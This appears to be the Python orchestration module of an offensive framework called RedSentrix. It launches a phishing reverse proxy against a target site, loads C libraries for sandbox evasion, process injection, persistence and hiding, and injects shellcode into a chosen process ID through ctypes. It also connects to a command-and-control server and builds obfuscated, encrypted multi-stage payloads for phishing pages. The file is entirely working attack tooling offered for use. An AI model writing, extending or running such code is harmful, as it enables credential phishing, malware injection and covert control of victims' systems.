"""
RedSentrix Orchestrator - Main coordination layer
Coordinates Go phishing proxy, C stealth libraries, and Python modules
"""

import os
import sys
import ctypes
import subprocess
import threading
import json
import time
from pathlib import Path
from typing import Optional, Dict, List

from .config import Config
from .logger import Logger
from .module_loader import ModuleLoader
from .payload_builder import PayloadBuilder
from .c2_client import C2Client


class Orchestrator:
    """Main orchestrator for RedSentrix framework"""
    
    def __init__(self, config_path: str = "config/phishing.yaml"):
        self.config = Config(config_path)
        self.logger = Logger()
        self.module_loader = ModuleLoader()
        self.payload_builder = PayloadBuilder()
        self.c2_client = None
        
        # Load C libraries
        self.stealth_libs = {}
        self._load_stealth_libraries()
        
        # Go proxy process
        self.proxy_process = None
        
    def _load_stealth_libraries(self):
        """Load C stealth libraries"""
        build_dir = Path("build/stealth")
        lib_ext = ".so" if sys.platform != "win32" else ".dll"
        
        libraries = {
            "evasion": "libevasion",
            "inject": "libinject",
            "memory": "libmemory",
            "persistence": "libpersistence",
            "hide": "libhide"
        }
        
        for name, lib_name in libraries.items():
            lib_path = build_dir / f"{lib_name}{lib_ext}"
            if lib_path.exists():
                try:
                    self.stealth_libs[name] = ctypes.CDLL(str(lib_path))
                    self.logger.log(f"Loaded {name} library", "info")
                except Exception as e:
                    self.logger.log(f"Failed to load {name}: {e}", "error")
            else:
                self.logger.log(f"Library {lib_path} not found", "warning")
    
    def start_phishing_proxy(self) -> bool:
        """Start the Go phishing proxy"""
        try:
            proxy_binary = Path("build/phishing/proxy")
            if not proxy_binary.exists():
                self.logger.log("Phishing proxy binary not found. Building...", "info")
                if not self._build_phishing_proxy():
                    return False
            
            # Get proxy configuration
            proxy_config = self.config.get("phishing", {})
            port = proxy_config.get("port", 8080)
            target_url = proxy_config.get("target_url", "")
            cert_path = proxy_config.get("cert_path", "")
            key_path = proxy_config.get("key_path", "")
            
            # Start proxy
            cmd = [str(proxy_binary), "-port", str(port), "-target", target_url]
            if cert_path and key_path:
                cmd.extend(["-cert", cert_path, "-key", key_path])
            
            self.proxy_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.logger.log(f"Phishing proxy started on port {port}", "info")
            return True
            
        except Exception as e:
            self.logger.log(f"Failed to start phishing proxy: {e}", "error")
            return False
    
    def _build_phishing_proxy(self) -> bool:
        """Build the Go phishing proxy"""
        try:
            result = subprocess.run(
                ["go", "build", "-o", "build/phishing/proxy", "./phishing/proxy"],
                cwd=Path.cwd(),
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                self.logger.log("Phishing proxy built successfully", "info")
                return True
            else:
                self.logger.log(f"Build failed: {result.stderr}", "error")
                return False
        except Exception as e:
            self.logger.log(f"Build error: {e}", "error")
            return False
    
    def check_evasion(self) -> bool:
        """Check if environment is safe using C evasion library"""
        if "evasion" not in self.stealth_libs:
            self.logger.log("Evasion library not loaded", "warning")
            return True  # Assume safe if library not available
        
        try:
            # Call C function: int is_safe_to_proceed()
            is_safe = self.stealth_libs["evasion"].is_safe_to_proceed
            is_safe.restype = ctypes.c_int
            result = is_safe()
            
            if result == 0:
                self.logger.log("Evasion checks failed - unsafe environment detected", "warning")
                return False
            return True
        except Exception as e:
            self.logger.log(f"Evasion check error: {e}", "error")
            return True  # Assume safe on error
    
    def inject_payload(self, target_pid: int, shellcode: bytes, method: int = 2) -> bool:
        """Inject payload into target process using C library"""
        if "inject" not in self.stealth_libs:
            self.logger.log("Injection library not loaded", "error")
            return False
        
        try:
            # Create injection context
            class InjectionCtx(ctypes.Structure):
                _fields_ = [
                    ("shellcode", ctypes.POINTER(ctypes.c_ubyte)),
                    ("shellcode_size", ctypes.c_size_t),
                    ("target_pid", ctypes.c_int),
                    ("injection_method", ctypes.c_int)
                ]
            
            # Allocate shellcode buffer
            shellcode_buf = (ctypes.c_ubyte * len(shellcode)).from_buffer_copy(shellcode)
            
            ctx = InjectionCtx()
            ctx.shellcode = ctypes.cast(shellcode_buf, ctypes.POINTER(ctypes.c_ubyte))
            ctx.shellcode_size = len(shellcode)
            ctx.target_pid = target_pid
            ctx.injection_method = method
            
            # Call C function: int perform_injection(injection_ctx_t *ctx)
            perform_injection = self.stealth_libs["inject"].perform_injection
            perform_injection.argtypes = [ctypes.POINTER(InjectionCtx)]
            perform_injection.restype = ctypes.c_int
            
            result = perform_injection(ctypes.byref(ctx))
            
            if result == 0:
                self.logger.log(f"Payload injected into PID {target_pid}", "info")
                return True
            else:
                self.logger.log(f"Injection failed for PID {target_pid}", "error")
                return False
                
        except Exception as e:
            self.logger.log(f"Injection error: {e}", "error")
            return False
    
    def connect_c2(self) -> bool:
        """Connect to C2 server"""
        c2_config = self.config.get("c2", {})
        if not c2_config.get("enabled", False):
            return False
        
        try:
            self.c2_client = C2Client(
                c2_config.get("url", ""),
                c2_config.get("key", "")
            )
            if self.c2_client.connect():
                self.logger.log("Connected to C2 server", "info")
                return True
            return False
        except Exception as e:
            self.logger.log(f"C2 connection error: {e}", "error")
            return False
    
    def generate_phishing_payload(self) -> str:
        """Generate payload to embed in phishing pages"""
        payload_config = self.config.get("payload", {})
        
        # Generate multi-stage payload
        payload = self.payload_builder.build_payload(
            stage=payload_config.get("stage", 1),
            obfuscate=payload_config.get("obfuscate", True),
            encrypt=payload_config.get("encrypt", True)
        )
        
        return payload
    
    def start(self):
        """Start the orchestrator"""
        self.logger.log("Starting RedSentrix Orchestrator...", "info")
        
        # Evasion checks
        if not self.check_evasion():
            self.logger.log("Evasion checks failed - aborting", "warning")
            return False
        
        # Start phishing proxy
        if not self.start_phishing_proxy():
            self.logger.log("Failed to start phishing proxy", "error")
            return False
        
        # Connect to C2 (if enabled)
        if self.config.get("c2", {}).get("enabled", False):
            self.connect_c2()
        
        # Load and execute modules
        modules = self.config.get("modules", [])
        for module_name in modules:
            self.module_loader.load_and_execute(module_name)
        
        self.logger.log("RedSentrix Orchestrator started successfully", "info")
        return True
    
    def stop(self):
        """Stop the orchestrator"""
        self.logger.log("Stopping RedSentrix Orchestrator...", "info")
        
        if self.proxy_process:
            self.proxy_process.terminate()
            self.proxy_process.wait()
        
        if self.c2_client:
            self.c2_client.disconnect()
        
        self.logger.log("RedSentrix Orchestrator stopped", "info")

